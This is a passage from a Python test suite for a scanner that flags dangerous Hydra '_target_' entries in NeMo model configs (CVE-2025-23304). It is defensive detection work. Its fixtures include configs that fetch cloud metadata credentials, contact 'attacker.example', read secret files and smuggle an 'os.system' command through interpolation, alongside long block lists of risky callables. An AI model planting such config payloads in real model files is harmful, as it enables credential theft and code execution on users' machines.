        config = {"model": {"_target_": target}}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.details.get("target") == target
            for check in result.checks
        )

    @pytest.mark.parametrize(
        "model_config",
        [
            {"_target_": "numpy.load", "file": "weights.npy", "allow_pickle": True},
            {"_target_": "numpy.load", "_args_": ["weights.npy", None, True]},
        ],
        ids=["kwarg_allow_pickle", "positional_allow_pickle"],
    )
    def test_numpy_load_with_pickle_enabled_is_dangerous(
        self,
        tmp_path: Path,
        model_config: dict[str, Any],
    ) -> None:
        """Pickle-enabled numpy.load calls remain dangerous file-access targets."""
        path = _create_nemo_file(tmp_path, {"model": model_config})

        result = NemoScanner().scan(str(path))

        cve_checks = [
            check
            for check in result.checks
            if check.name == "CVE-2025-23304: Dangerous Hydra _target_" and check.details.get("target") == "numpy.load"
        ]
        assert len(cve_checks) == 1
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.CRITICAL

    def test_skops_load_target_is_review_only(self, tmp_path: Path) -> None:
        """skops.io.load should not be CVE-critical without vulnerable content context."""
        config = {"model": {"_target_": "skops.io.load", "file": "model.skops"}}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        assert not [
            check
            for check in result.checks
            if check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.details.get("target") == "skops.io.load"
        ]
        review_checks = [
            check
            for check in result.checks
            if check.name == "Hydra _target_ Review" and check.details.get("target") == "skops.io.load"
        ]
        assert len(review_checks) == 1
        assert review_checks[0].severity == IssueSeverity.INFO

    @pytest.mark.parametrize(
        ("target", "target_config"),
        [
            (
                "urllib.request.urlretrieve",
                {
                    "_target_": "urllib.request.urlretrieve",
                    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "filename": "__MODELAUDIT_TMP__/modelaudit-nemo-download",
                },
            ),
            (
                "urllib.request.urlopen",
                {
                    "_target_": "urllib.request.urlopen",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "requests.get",
                {
                    "_target_": "requests.get",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "requests.api.get",
                {
                    "_target_": "requests.api.get",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "requests.sessions.Session.get",
                {
                    "_target_": "requests.sessions.Session.get",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "requests.Session.send",
                {
                    "_target_": "requests.Session.send",
                    "_args_": [{"_target_": "requests.Request", "url": "http://169.254.169.254/latest/meta-data/"}],
                },
            ),
            (
                "httpx.post",
                {
                    "_target_": "httpx.post",
                    "url": "http://169.254.169.254/latest/user-data",
                    "data": "payload",
                },
            ),
            (
                "httpx._api.post",
                {
                    "_target_": "httpx._api.post",
                    "url": "http://169.254.169.254/latest/user-data",
                    "data": "payload",
                },
            ),
            (
                "httpx.Client.get",
                {
                    "_target_": "httpx.Client.get",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "httpx._client.Client.send",
                {
                    "_target_": "httpx._client.Client.send",
                    "_args_": [{"_target_": "httpx.Request", "method": "GET", "url": "http://169.254.169.254/"}],
                },
            ),
            (
                "urllib3.request",
                {
                    "_target_": "urllib3.request",
                    "method": "GET",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "urllib3.PoolManager.request",
                {
                    "_target_": "urllib3.PoolManager.request",
                    "method": "GET",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "urllib3.poolmanager.PoolManager.request",
                {
                    "_target_": "urllib3.poolmanager.PoolManager.request",
                    "method": "GET",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "urllib3.poolmanager.ProxyManager.urlopen",
                {
                    "_target_": "urllib3.poolmanager.ProxyManager.urlopen",
                    "method": "GET",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "urllib3.HTTPConnectionPool.request",
                {
                    "_target_": "urllib3.HTTPConnectionPool.request",
                    "method": "GET",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "urllib3.connectionpool.HTTPSConnectionPool.urlopen",
                {
                    "_target_": "urllib3.connectionpool.HTTPSConnectionPool.urlopen",
                    "method": "GET",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "urllib.request.OpenerDirector.open",
                {
                    "_target_": "urllib.request.OpenerDirector.open",
                    "_args_": ["http://169.254.169.254/latest/meta-data/"],
                },
            ),
            (
                "urllib.request.URLopener.retrieve",
                {
                    "_target_": "urllib.request.URLopener.retrieve",
                    "_args_": [
                        "http://169.254.169.254/latest/meta-data/",
                        "__MODELAUDIT_TMP__/modelaudit-nemo-download",
                    ],
                },
            ),
            (
                "urllib.request.URLopener.open_http",
                {
                    "_target_": "urllib.request.URLopener.open_http",
                    "_args_": ["http://169.254.169.254/latest/meta-data/"],
                },
            ),
            (
                "urllib.request.FancyURLopener.open_https",
                {
                    "_target_": "urllib.request.FancyURLopener.open_https",
                    "_args_": ["https://169.254.169.254/latest/meta-data/"],
                },
            ),
            (
                "urllib.request.URLopener.open_local_file",
                {
                    "_target_": "urllib.request.URLopener.open_local_file",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "http.client.HTTPConnection.request",
                {
                    "_target_": "http.client.HTTPConnection.request",
                    "method": "GET",
                    "url": "/latest/meta-data/",
                },
            ),
            (
                "http.client.HTTPConnection.connect",
                {
                    "_target_": "http.client.HTTPConnection.connect",
                    "_args_": [{"_target_": "http.client.HTTPConnection", "host": "169.254.169.254"}],
                },
            ),
            (
                "http.client.HTTPConnection.getresponse",
                {
                    "_target_": "http.client.HTTPConnection.getresponse",
                    "_args_": [{"_target_": "http.client.HTTPConnection", "host": "169.254.169.254"}],
                },
            ),
            (
                "socket.create_connection",
                {
                    "_target_": "socket.create_connection",
                    "_args_": [["169.254.169.254", 80]],
                },
            ),
            (
                "socket.getaddrinfo",
                {
                    "_target_": "socket.getaddrinfo",
                    "_args_": ["attacker.example", 443],
                },
            ),
            (
                "socket.gethostbyname",
                {
                    "_target_": "socket.gethostbyname",
                    "_args_": ["attacker.example"],
                },
            ),
            (
                "_socket.gethostbyname",
                {
                    "_target_": "_socket.gethostbyname",
                    "_args_": ["attacker.example"],
                },
            ),
            (
                "socket.socket.sendto",
                {
                    "_target_": "socket.socket.sendto",
                    "_args_": [{"_target_": "socket.socket"}, b"GET /", ["169.254.169.254", 80]],
                },
            ),
            (
                "socket.SocketType.connect",
                {
                    "_target_": "socket.SocketType.connect",
                    "_args_": [["169.254.169.254", 80]],
                },
            ),
            (
                "_socket.SocketType.sendall",
                {
                    "_target_": "_socket.SocketType.sendall",
                    "_args_": [{"_target_": "_socket.SocketType"}, b"GET /"],
                },
            ),
            (
                "_socket.socket.sendto",
                {
                    "_target_": "_socket.socket.sendto",
                    "_args_": [{"_target_": "_socket.socket"}, b"GET /", ["169.254.169.254", 80]],
                },
            ),
            (
                "socket.socket.connect",
                {
                    "_target_": "socket.socket.connect",
                    "_args_": [["169.254.169.254", 80]],
                },
            ),
            (
                "socket.socket.recv",
                {
                    "_target_": "socket.socket.recv",
                    "_args_": [{"_target_": "socket.socket"}, 1024],
                },
            ),
            (
                "pathlib.Path.write_text",
                {
                    "_target_": "pathlib.Path.write_text",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", "payload"],
                },
            ),
            (
                "pathlib.Path.read_text",
                {
                    "_target_": "pathlib.Path.read_text",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "pathlib.Path.read_bytes",
                {
                    "_target_": "pathlib.Path.read_bytes",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "builtins.open",
                {
                    "_target_": "builtins.open",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", "w"],
                },
            ),
            (
                "codecs.open",
                {
                    "_target_": "codecs.open",
                    "_args_": ["modelaudit-nemo-write", "w"],
                },
            ),
            (
                "_io.FileIO",
                {
                    "_target_": "_io.FileIO",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", "w"],
                },
            ),
            (
                "io.FileIO",
                {
                    "_target_": "io.FileIO",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", "w"],
                },
            ),
            (
                "_io.open",
                {
                    "_target_": "_io.open",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", "w"],
                },
            ),
            (
                "io.open_code",
                {
                    "_target_": "io.open_code",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret.py"],
                },
            ),
            (
                "_io.open_code",
                {
                    "_target_": "_io.open_code",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret.py"],
                },
            ),
            (
                "os.open",
                {
                    "_target_": "os.open",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", 65],
                },
            ),
            (
                "posix.open",
                {
                    "_target_": "posix.open",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", 65],
                },
            ),
            (
                "os.read",
                {
                    "_target_": "os.read",
                    "_args_": [0, 1024],
                },
            ),
            (
                "os.write",
                {
                    "_target_": "os.write",
                    "_args_": [1, "payload"],
                },
            ),
            (
                "os.listdir",
                {
                    "_target_": "os.listdir",
                    "_args_": ["__MODELAUDIT_TMP__/"],
                },
            ),
            (
                "os.scandir",
                {
                    "_target_": "os.scandir",
                    "_args_": ["__MODELAUDIT_TMP__/"],
                },
            ),
            (
                "glob.glob",
                {
                    "_target_": "glob.glob",
                    "_args_": ["__MODELAUDIT_TMP__/*"],
                },
            ),
            (
                "pathlib.Path.stat",
                {
                    "_target_": "pathlib.Path.stat",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "os.path.exists",
                {
                    "_target_": "os.path.exists",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "posixpath.isfile",
                {
                    "_target_": "posixpath.isfile",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "ntpath.isdir",
                {
                    "_target_": "ntpath.isdir",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "pathlib.Path.exists",
                {
                    "_target_": "pathlib.Path.exists",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "pathlib.PosixPath.is_file",
                {
                    "_target_": "pathlib.PosixPath.is_file",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "pathlib.WindowsPath.is_dir",
                {
                    "_target_": "pathlib.WindowsPath.is_dir",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "pathlib.PosixPath.write_text",
                {
                    "_target_": "pathlib.PosixPath.write_text",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", "payload"],
                },
            ),
            (
                "pathlib.PosixPath.read_text",
                {
                    "_target_": "pathlib.PosixPath.read_text",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "pathlib.PosixPath.read_bytes",
                {
                    "_target_": "pathlib.PosixPath.read_bytes",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "pathlib.Path.readlink",
                {
                    "_target_": "pathlib.Path.readlink",
                    "_args_": ["modelaudit-nemo-link"],
                },
            ),
            (
                "os.rename",
                {
                    "_target_": "os.rename",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-source", "__MODELAUDIT_TMP__/modelaudit-nemo-dest"],
                },
            ),
            (
                "os.replace",
                {
                    "_target_": "os.replace",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-source", "__MODELAUDIT_TMP__/modelaudit-nemo-dest"],
                },
            ),
            (
                "pathlib.Path.rename",
                {
                    "_target_": "pathlib.Path.rename",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-source", "__MODELAUDIT_TMP__/modelaudit-nemo-dest"],
                },
            ),
            (
                "pathlib.Path.touch",
                {
                    "_target_": "pathlib.Path.touch",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-created"],
                },
            ),
            (
                "pathlib.Path.symlink_to",
                {
                    "_target_": "pathlib.Path.symlink_to",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-link", "__MODELAUDIT_TMP__/modelaudit-nemo-target"],
                },
            ),
            (
                "pathlib.PosixPath.hardlink_to",
                {
                    "_target_": "pathlib.PosixPath.hardlink_to",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-link", "__MODELAUDIT_TMP__/modelaudit-nemo-target"],
                },
            ),
            (
                "pathlib.WindowsPath.read_text",
                {
                    "_target_": "pathlib.WindowsPath.read_text",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "shutil.copyfile",
                {
                    "_target_": "shutil.copyfile",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-source", "__MODELAUDIT_TMP__/modelaudit-nemo-dest"],
                },
            ),
        ],
    )
    def test_network_and_file_access_targets_are_dangerous(
        self,
        tmp_path: Path,
        target: str,
        target_config: dict[str, Any],
    ) -> None:
        """Network and file-access callables must not fall through to INFO-only review."""
        localized_target_config = _materialize_tmp_paths(target_config, tmp_path)
        path = _create_nemo_file(tmp_path, {"model": localized_target_config})

        result = NemoScanner().scan(str(path))

        cve_checks = [
            check
            for check in result.checks
            if check.name == "CVE-2025-23304: Dangerous Hydra _target_" and check.details.get("target") == target
        ]
        assert len(cve_checks) == 1
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        assert cve_checks[0].details["cve_id"] == "CVE-2025-23304"

    @pytest.mark.parametrize(
        "target",
        [
            "http.client.HTTPConnection.endheaders",
            "http.client.HTTPSConnection.endheaders",
            "http.client.HTTPConnection._send_output",
            "http.client.HTTPSConnection._send_output",
            "http.client.HTTPResponse.read",
            "http.client.HTTPResponse.read1",
            "http.client.HTTPResponse.readinto",
            "http.client.HTTPResponse.readinto1",
            "http.client.HTTPResponse.readline",
            "http.client.HTTPResponse.readlines",
            "http.client.HTTPResponse.peek",
            "socketserver.TCPServer",
            "socketserver.UDPServer",
            "socketserver.ThreadingTCPServer",
            "socketserver.ThreadingUDPServer",
            "http.server.HTTPServer",
            "http.server.ThreadingHTTPServer",
            "wsgiref.simple_server.WSGIServer",
            "wsgiref.simple_server.make_server",
            "socket.socket.accept",
            "socket.socket.bind",
            "socket.socket.listen",
            "socket.socket.sendfile",
            "socket.socket.recv_into",
            "socket.socket.recvfrom_into",
            "socket.socket.recvmsg_into",
            "socket.SocketType.accept",
            "socket.SocketType.bind",
            "socket.SocketType.listen",
            "socket.SocketType.sendfile",
            "socket.SocketType.recv_into",
            "socket.SocketType.recvfrom_into",
            "socket.SocketType.recvmsg_into",
            "socket.send_fds",
            "socket.recv_fds",
            "_socket.socket.accept",
            "_socket.socket.bind",
            "_socket.socket.listen",
            "_socket.socket.recv_into",
            "_socket.socket.recvfrom_into",
            "_socket.socket.recvmsg_into",
            "_socket.SocketType.accept",
            "_socket.SocketType.bind",
            "_socket.SocketType.listen",
            "_socket.SocketType.recv_into",
            "_socket.SocketType.recvfrom_into",
            "_socket.SocketType.recvmsg_into",
            "os.access",
            "posix.access",
            "nt.access",
            "os.fstat",
            "posix.fstat",
            "nt.fstat",
            "os.statvfs",
            "posix.statvfs",
            "os.fstatvfs",
            "posix.fstatvfs",
            "os.chdir",
            "posix.chdir",
            "nt.chdir",
            "os.fchdir",
            "posix.fchdir",
            "os.readv",
            "posix.readv",
            "os.pread",
            "posix.pread",
            "os.preadv",
            "posix.preadv",
            "os.writev",
            "posix.writev",
            "os.pwrite",
            "posix.pwrite",
            "os.pwritev",
            "posix.pwritev",
            "os.sendfile",
            "posix.sendfile",
            "os.copy_file_range",
            "posix.copy_file_range",
            "os.splice",
            "posix.splice",
            "os.path.lexists",
            "posixpath.lexists",
            "ntpath.lexists",
            "os.path.realpath",
            "posixpath.realpath",
            "ntpath.realpath",
            "os.path.samefile",
            "posixpath.samefile",
            "ntpath.samefile",
            "os.path.sameopenfile",
            "posixpath.sameopenfile",
            "ntpath.sameopenfile",
            "genericpath.exists",
            "genericpath.isfile",
            "genericpath.isdir",
            "genericpath.getatime",
            "genericpath.getctime",
            "genericpath.getmtime",
            "genericpath.getsize",
            "genericpath.samefile",
            "genericpath.sameopenfile",
            "os.path.ismount",
            "posixpath.ismount",
            "ntpath.ismount",
            "pathlib.Path.resolve",
            "pathlib.PosixPath.resolve",
            "pathlib.WindowsPath.resolve",
            "pathlib.Path.samefile",
            "pathlib.PosixPath.samefile",
            "pathlib.WindowsPath.samefile",
            "pathlib.Path.owner",
            "pathlib.PosixPath.owner",
            "pathlib.WindowsPath.owner",
            "pathlib.Path.group",
            "pathlib.PosixPath.group",
            "pathlib.WindowsPath.group",
            "pathlib.Path.is_socket",
            "pathlib.PosixPath.is_socket",
            "pathlib.WindowsPath.is_socket",
            "pathlib.Path.is_fifo",
            "pathlib.PosixPath.is_fifo",
            "pathlib.WindowsPath.is_fifo",
            "pathlib.Path.is_block_device",
            "pathlib.PosixPath.is_block_device",
            "pathlib.WindowsPath.is_block_device",
            "pathlib.Path.is_char_device",
            "pathlib.PosixPath.is_char_device",
            "pathlib.WindowsPath.is_char_device",
            "os.chmod",
            "posix.chmod",
            "nt.chmod",
            "os.fchmod",
            "posix.fchmod",
            "nt.fchmod",
            "os.chown",
            "posix.chown",
            "os.fchown",
            "posix.fchown",
            "os.lchown",
            "posix.lchown",
            "os.utime",
            "posix.utime",
            "nt.utime",
            "os.ftruncate",
            "posix.ftruncate",
            "nt.ftruncate",
            "os.fsync",
            "posix.fsync",
            "nt.fsync",
            "os.fdatasync",
            "posix.fdatasync",
            "os.mknod",
            "posix.mknod",
            "os.mkfifo",
            "posix.mkfifo",
            "os.getxattr",
            "posix.getxattr",
            "os.listxattr",
            "posix.listxattr",
            "os.setxattr",
            "posix.setxattr",
            "os.removexattr",
            "posix.removexattr",
            "shutil.copyfileobj",
            "shutil.copymode",
            "shutil.copystat",
            "shutil.chown",
            "shutil.disk_usage",
            "shutil.make_archive",
            "shutil.unpack_archive",
            "tarfile.TarFile.extract",
            "tarfile.TarFile.extractall",
            "zipfile.ZipFile.extract",
            "zipfile.ZipFile.extractall",
            "torch.save",
            "torch.serialization.save",
            "transformers.pipeline",
            "transformers.AutoModel.from_pretrained",
            "transformers.AutoTokenizer.from_pretrained",
            "socket.socket",
            "socket.SocketType",
            "socket.socketpair",
            "_socket.socket",
            "_socket.SocketType",
            "_socket.socketpair",
            "os.pipe",
            "posix.pipe",
            "nt.pipe",
            "os.pipe2",
            "posix.pipe2",
            "nt.pipe2",
            "os.close",
            "posix.close",
            "nt.close",
            "os.closerange",
            "posix.closerange",
            "nt.closerange",
            "os.dup",
            "posix.dup",
            "nt.dup",
            "os.dup2",
            "posix.dup2",
            "nt.dup2",
            "logging.config.dictConfig",
            "logging.config.fileConfig",
            "site.addpackage",
            "site.addsitedir",
            "site.execsitecustomize",
            "site.execusercustomize",
            "site.main",
            "linecache.checkcache",
            "linecache.getline",
            "linecache.getlines",
            "linecache.updatecache",
            "logging.FileHandler",
            "logging.handlers.BaseRotatingHandler",
            "logging.handlers.RotatingFileHandler",
            "logging.handlers.SysLogHandler",
            "logging.handlers.TimedRotatingFileHandler",
            "logging.handlers.WatchedFileHandler",
            "omegaconf.OmegaConf.load",
            "omegaconf.OmegaConf.save",
            "omegaconf.omegaconf.OmegaConf.load",
            "omegaconf.omegaconf.OmegaConf.save",
            "tokenize.open",
            "importlib.resources.open_binary",
            "importlib.resources.open_text",
            "importlib.resources.read_binary",
            "importlib.resources.read_text",
            "pkgutil.get_data",
            "pathlib.Path.chmod",
            "pathlib.PosixPath.chmod",
            "pathlib.WindowsPath.chmod",
            "pathlib.Path.lchmod",
            "pathlib.PosixPath.lchmod",
            "pathlib.WindowsPath.lchmod",
            "pathlib.Path.link_to",
            "pathlib.PosixPath.link_to",
            "pathlib.WindowsPath.link_to",
        ],
    )
    def test_additional_immediate_io_targets_are_dangerous(self, tmp_path: Path, target: str) -> None:
        """Immediate I/O aliases in covered sink families must not remain INFO-only."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})

        result = NemoScanner().scan(str(path))

        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.details.get("target") == target
            for check in result.checks
        )

    @pytest.mark.parametrize(
        "target",
        [
            "omegaconf.OmegaConf.create",
            "omegaconf.omegaconf.OmegaConf.create",
        ],
    )
    def test_non_io_omegaconf_targets_remain_safe(self, tmp_path: Path, target: str) -> None:
        """Exact OmegaConf I/O overrides must not invalidate the broader safe namespace."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})

        result = NemoScanner().scan(str(path))

        assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
        assert any(
            check.name == "Hydra _target_ Safety Check"
            and check.status == CheckStatus.PASSED
            and check.details.get("target") == target
            for check in result.checks
        )

    def test_transformers_factory_without_loading_remains_safe(self, tmp_path: Path) -> None:
        """The from_pretrained override must not invalidate safe Transformers factories."""
        target = "transformers.AutoModel"
        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})

        result = NemoScanner().scan(str(path))

        assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
        assert any(
            check.name == "Hydra _target_ Safety Check"
            and check.status == CheckStatus.PASSED
            and check.details.get("target") == target
            for check in result.checks
        )

    @pytest.mark.parametrize(
        "target",
        [
            "hydra.compose",
            "hydra.compose.compose",
            "hydra.experimental.compose",
            "hydra.experimental.initialize",
            "hydra.experimental.initialize_config_dir",
            "hydra.experimental.initialize_config_module",
            "hydra.initialize",
            "hydra.initialize.initialize",
            "hydra.initialize.initialize_config_dir",
            "hydra.initialize.initialize_config_module",
            "hydra.initialize_config_dir",
            "hydra.initialize_config_module",
            "hydra.core.config_store.ConfigStore.store",
            "hydra.core.config_store.ConfigStoreWithProvider.store",
            "hydra.core.global_hydra.GlobalHydra.clear",
            "hydra.core.global_hydra.GlobalHydra.initialize",
            "hydra.core.global_hydra.GlobalHydra.set_instance",
            "hydra.core.utils._save_config",
            "hydra.core.utils.configure_log",
            "hydra.core.utils.run_job",
            "hydra._internal.utils._locate",
            "hydra.utils._locate",
            "hydra.utils.get_class",
            "hydra.utils.get_method",
            "hydra.utils.get_object",
            "hydra.utils.get_static_method",
            "omegaconf.OmegaConf.clear_resolver",
            "omegaconf.OmegaConf.clear_resolvers",
            "omegaconf.OmegaConf.legacy_register_resolver",
            "omegaconf.OmegaConf.register_new_resolver",
            "omegaconf.OmegaConf.register_resolver",
            "omegaconf.omegaconf.OmegaConf.clear_resolver",
            "omegaconf.omegaconf.OmegaConf.clear_resolvers",
            "omegaconf.omegaconf.OmegaConf.legacy_register_resolver",
            "omegaconf.omegaconf.OmegaConf.register_new_resolver",
            "omegaconf.omegaconf.OmegaConf.register_resolver",
            "transformers.dynamic_module_utils._compute_local_source_files_hash",
            "transformers.dynamic_module_utils.check_imports",
            "transformers.dynamic_module_utils.check_python_requirements",
            "transformers.dynamic_module_utils.create_dynamic_module",
            "transformers.dynamic_module_utils.custom_object_save",
            "transformers.dynamic_module_utils.get_cached_module_file",
            "transformers.dynamic_module_utils.get_class_from_dynamic_module",
            "transformers.dynamic_module_utils.get_class_in_module",
            "transformers.dynamic_module_utils.get_imports",
            "transformers.dynamic_module_utils.get_relative_import_files",
            "transformers.dynamic_module_utils.get_relative_imports",
            "transformers.dynamic_module_utils.init_hf_modules",
            "transformers.dynamic_module_utils.resolve_trust_remote_code",
            "transformers.pipelines.audio_classification.ffmpeg_read",
            "transformers.pipelines.audio_utils.ffmpeg_read",
            "transformers.testing_utils.run_command",
            "transformers.utils.cached_file",
            "transformers.utils.hub.PushToHubMixin._create_repo",
            "transformers.utils.hub.PushToHubMixin._upload_modified_files",
            "transformers.utils.hub.cached_file",
            "transformers.utils.hub.cached_files",
            "transformers.utils.hub.create_branch",
            "transformers.utils.hub.create_commit",
            "transformers.utils.hub.create_repo",
            "transformers.utils.hub.create_and_tag_model_card",
            "transformers.utils.hub.define_sagemaker_information",
            "transformers.utils.hub.download_url",
            "transformers.utils.hub.get_file_from_repo",
            "transformers.utils.hub.get_checkpoint_shard_files",
            "transformers.utils.hub.has_file",
            "transformers.utils.hub.hf_hub_download",
            "transformers.utils.hub.http_get",
            "transformers.utils.hub.httpx.get",
            "transformers.utils.hub.list_repo_templates",
            "transformers.utils.hub.list_repo_tree",
            "transformers.utils.hub.requests.get",
            "transformers.utils.hub.snapshot_download",
            "transformers.utils.import_utils._LazyModule._get_module",
            "transformers.utils.import_utils.clear_import_cache",
            "transformers.utils.import_utils.create_import_structure_from_path",
            "transformers.utils.import_utils.define_import_structure",
            "transformers.utils.import_utils.direct_transformers_import",
            "numpy.char.chararray.dump",
            "numpy.char.chararray.tofile",
            "numpy.ma.MaskedArray.dump",
            "numpy.ma.MaskedArray.tofile",
            "numpy.matrix.dump",
            "numpy.matrix.tofile",
            "numpy.recarray.dump",
            "numpy.recarray.tofile",
            "numpy.distutils.exec_command._exec_command",
            "numpy.distutils.exec_command.exec_command",
            "numpy.load.__call__",
            "numpy.load.__call__.__call__",
            "transformers.utils.hub.cached_file.__call__",
        ],
    )
    def test_safe_namespace_side_effect_targets_are_dangerous(self, tmp_path: Path, target: str) -> None:
        """Broad trusted namespaces must not hide import, global-state, network, or file side effects."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})

        result = NemoScanner().scan(str(path))

        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.details.get("target") == target
            for check in result.checks
        )

    @pytest.mark.parametrize(
        "target",
        [
            "hydra.utils.get_original_cwd",
            "hydra.utils.to_absolute_path",
            "hydra.core.config_store.ConfigStore.list",
            "hydra.core.global_hydra.GlobalHydra.is_initialized",
            "hydra.core.utils.filter_overrides",
            "numpy.recarray.tobytes",
            "omegaconf.OmegaConf.has_resolver",
            "torch.utils.data.DataLoader.__call__",
            "transformers.pipelines.audio_utils.chunk_bytes_iter",
            "transformers.pipelines.audio_utils.ffmpeg_microphone",
            "transformers.pipelines.audio_utils.ffmpeg_microphone_live",
            "transformers.utils.PushToHubMixin.save_pretrained",
            "transformers.utils.PushToHubMixin.save_pretrained.__call__",
            "transformers.utils.hub.PushToHubMixin.save_pretrained",
            "transformers.utils.hub.PushToHubMixin.save_pretrained.__call__.__call__",
        ],
    )
    def test_safe_namespace_side_effect_near_matches_remain_safe(self, tmp_path: Path, target: str) -> None:
        """Exact helpers and method suffixes must not promote similarly named safe-namespace callables."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})

        result = NemoScanner().scan(str(path))

        assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
        assert any(
            check.name == "Hydra _target_ Safety Check"
            and check.status == CheckStatus.PASSED
            and check.details.get("target") == target
            for check in result.checks
        )

    @pytest.mark.parametrize(
        ("target", "target_config", "expected_argument", "expected_reason"),
        [
            (
                "hydra.utils.call",
                {"_target_": "hydra.utils.call", "config": "${payload}"},
                "model.config",
                "interpolated_helper_argument",
            ),
            (
                "hydra.utils.instantiate",
                {"_target_": "hydra.utils.instantiate", "_args_": ["${payload}"]},
                "model._args_[0]",
                "interpolated_helper_argument",
            ),
            (
                "hydra.utils.instantiate",
                {
                    "_target_": "hydra.utils.instantiate",
                    "config": [{"value": "${oc.create:'{_target_: os.system, command: id}'}"}],
                },
                "model.config[0].value",
                "interpolated_helper_argument",
            ),
            (
                "hydra.utils.instantiate",
                {
                    "_target_": "hydra.utils.instantiate",
                    "config": [{"value": "${plugin.build_config:payload}"}],
                },
                "model.config[0].value",
                "interpolated_helper_argument",
            ),
            (
                "hydra.utils.instantiate",
                {
                    "_target_": "hydra.utils.instantiate",
                    "config": [{"value": "${oc.select:payload}"}],
                },
                "model.config[0].value",
                "interpolated_helper_argument",
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                    "restore_path": "/tmp/model.ckpt",
                },
                "model.restore_path",
                "absolute_model_load_path",
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.load_from_checkpoint",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.load_from_checkpoint",
                    "checkpoint_path": "../model.ckpt",
                },
                "model.checkpoint_path",
                "traversal_model_load_path",
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.load_from_checkpoint",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.load_from_checkpoint",
                    "checkpoint_path": "${oc.env:CHECKPOINT_PATH}",
                },
                "model.checkpoint_path",
                "interpolated_helper_argument",
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                    "override_config_path": "file:///etc/nemo.yaml",
                },
                "model.override_config_path",
